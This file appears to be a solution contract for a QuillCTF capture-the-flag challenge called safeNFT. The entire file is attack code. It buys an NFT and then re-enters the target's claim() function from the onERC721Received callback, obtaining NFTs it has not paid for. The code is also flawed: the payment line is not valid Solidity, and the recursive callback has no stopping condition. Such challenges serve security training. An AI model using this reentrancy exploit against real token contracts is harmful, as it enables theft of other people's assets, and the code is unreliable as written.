pragma solidity ^0.8.7;

import "../src/quillctf4.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Quillctf4 is IERC721Receiver {
  safeNFT implementation;
  

  constructor(address _implementation) {
    implementation = safeNFT(_implementation);
    // maxMints = _maxMints;
  }

  function beginMint() external {
    implementation.buyNFT().send(0.01 ether);
    implementation.claim();
  }

  function onERC721Received(
    address,
    address,
    uint256,
    bytes memory
  ) public virtual override returns (bytes4) {
    
    implementation.claim();
    
    return this.onERC721Received.selector;
  }
}
